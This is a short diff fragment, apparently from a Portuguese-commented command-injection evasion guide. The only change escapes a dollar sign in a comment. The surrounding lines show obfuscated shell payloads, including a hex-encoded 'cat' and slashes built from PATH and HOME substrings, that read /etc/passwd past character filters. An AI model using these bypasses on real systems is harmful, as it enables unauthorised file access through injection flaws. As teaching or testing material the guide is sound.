@@ -361,7 +361,7 @@ $(printf '\\x63\\x61\\x74') /etc/passwd
 # ═══════════════════════════════════════════════════
 # Usando variável PATH para obter "/"
 cat \${PATH%%u*}etc\${PATH%%u*}passwd
-# PATH=/usr/bin → ${PATH%%u*} = "/" → cat /etc/passwd
+# PATH=/usr/bin → \${PATH%%u*} = "/" → cat /etc/passwd
 
 # Usando $HOME
 cat \${HOME:0:1}etc\${HOME:0:1}passwd
